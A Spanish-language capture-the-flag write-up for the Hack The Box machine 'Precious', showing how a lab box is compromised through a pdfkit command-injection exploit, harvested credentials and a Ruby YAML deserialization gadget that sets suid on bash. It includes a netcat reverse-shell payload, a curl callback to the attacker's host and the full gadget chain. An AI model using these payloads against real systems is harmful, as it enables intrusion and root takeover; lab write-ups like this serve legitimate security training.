---
tags:
title: Precious - Easy (HTB)
permalink: /Precious-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.228.98
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-18 15:54 -03
Nmap scan report for 10.129.228.98
Host is up (0.92s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.20 seconds

```

## Website / Port 80

La pagina principal, presenta una utilidad la cual hace un fetch a determinada `ip` donde luego convierte el contenido de la misma a `pdf`.

![image-center](/assets/images/{22A70818-C71D-4235-9A26-CE37CE7A8167}.png)

## Shell as ruby

Interceptando la peticion con `Burpsuite` veo que al pie de la respuesta, parece que el pfd se genera con `Pdfkit` mas en concreto con la version `v0.8.6`.
```bash
<rdf:Description rdf:about=''
  xmlns:dc='http://purl.org/dc/elements/1.1/'>
  <dc:creator>
   <rdf:Seq>
    <rdf:li>Generated by pdfkit v0.8.6</rdf:li>
   </rdf:Seq>
  </dc:creator>
 </rdf:Description>
</rdf:RDF>
</x:xmpmeta>
```

Podría buscar exploit para dicha herramienta, y veo un solo exploit, que si bien es de una versión mas actualizada podría probar de igual manera.

```bash
 searchsploit pdfkit                  
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
pdfkit v0.8.7.2 - Command Injection                                                                                                                      | ruby/local/51293.py
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Lo descargo a mi maquina.

```bash
searchsploit -m ruby/local/51293.py  
  Exploit: pdfkit v0.8.7.2 - Command Injection
      URL: https://www.exploit-db.com/exploits/51293
     Path: /usr/share/exploitdb/exploits/ruby/local/51293.py
    Codes: CVE-2022–25765
 Verified: True
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/zsln/Desktop/zsln/htb/precious/51293.py
```

Ejecuto el script pasándole la `url` y el parámetro vulnerable el cual es `url` tambien.

```bash
python3 exploit.py -c 'curl http://10.10.17.19' -w http://precious.htb
ERRORED: Provide a target site and post parameter! "-w <http://target.com/index.html> -p <parameter>"
                                                                                                                                    python3 exploit.py -c 'curl http://10.10.17.19' -w http://precious.htb -p url 

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Custom Command Send to Target Website Mode
PAYLOAD: http://%20`curl http://10.10.17.19`
WARNING: Wrap custom command in "quotes" if it has spaces.
WEBSITE: http://precious.htb
POSTARG: url
EXPLOIT: Payload sent to website!
SUCCESS: Exploit performed action.
```

Y veo que recibo la peticion, por lo que podria intentar enviarme una reverse shell a mi maquina
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.129.228.98 - - [18/Nov/2025 16:03:51] "GET / HTTP/1.1" 200 -
```

Ejecuto el scritp enviando una shell a mi maquina.

```bash
python3 exploit.py -c 'busybox nc 10.10.17.19 443 -e bash' -w http://precious.htb -p url 

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Custom Command Send to Target Website Mode
PAYLOAD: http://%20`busybox nc 10.10.17.19 443 -e bash`
WARNING: Wrap custom command in "quotes" if it has spaces.
WEBSITE: http://precious.htb
POSTARG: url
```

Y desde mi listener `nc` recibo la shell como el usuario `ruby`

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.228.98] 37028
whoami
ruby
```

## Shell as henry

En el directorio personal de `ruby` veo una carpeta `.config` la cual tiene un archivo tambien llamado config, el cual parece tener las credenciales de otro usuario de la maquina.

```bash
ruby@precious:~$ cd .bundle/
ruby@precious:~/.bundle$ ls
config
ruby@precious:~/.bundle$ cat config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Pruebo conexion usando las credenciales de `henry`.

```bash
ruby@precious:~/.bundle$ su henry
Password: 
henry@precious:/home/ruby/.bundle$ whoami
henry
```

```bash
henry@precious:/home/ruby/.bundle$ cat /home/henry/user.txt 
ad8c6296098751e6a349c4dbeedb9155
```

## Shell as root 

### Enumeration

Veo que tenemos el privilegio de ejecutar `/usr/bin/ruby` sobre el archivo **`/opt/update_dependencies.rb`**.

```bash
henry@precious:/tmp$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Viendo el contenido de `update_dependencies.rb`, veo lo siguiente.

```ruby
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

Al parecer el script carga las librerias `yaml` y `rubygems`, por otro lado veo que intentar leer del contenido del archivo `dependencies.yml`, ubicado en el directorio actual de trabajo. Sin validar que sea el mismo archivo que se ubica en `/opt/samples` donde tengo un ejemplo del mismo archivo. Por lo que podria crear un **`dependencies.yml`** malicioso, el cual ejecute una accion determinada como `root` al intentar leer del archivo.

Como no se donde o de que forma lograr que un archivo `.yml` ejecute un comando, busque en internet y me cruze con este [enlace](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/) donde se ve una demostracion de como en la entrada `git_set` en donde le tenemos que indicar el comando a ejecutar, en el ejemplo usa el comando `id` pero en mi caso voy a intentar asigarle el bit **`suid`** a la `bash`.

Primero chequeo el permiso de la misma.

```bash
henry@precious:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Ya despues creo mi archivo que quedaria de la siguiente manera:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: 'chmod u+s /bin/bash'
         method_id: :resolve
```

Ahora puedo ejecutar **`ruby`** pasándole como parámetro el archivo `.rb`.

```bash
henry@precious:/tmp$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)

```

Y después de un par de errores veo que se le asigno el bit `suid` a la bash ya que el comando lo ejecute como `root`.

```
henry@precious:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Cambio mi shell a una como `root`, para poder ver la flag.

```bash
henry@precious:/tmp$ bash -p 
bash-5.1# whoami
root
```

```bash
bash-5.1# cat /root/root.txt 
448ad5c022bd66e05bd43d31cc31dc3e
```

`~Happy Hacking.`




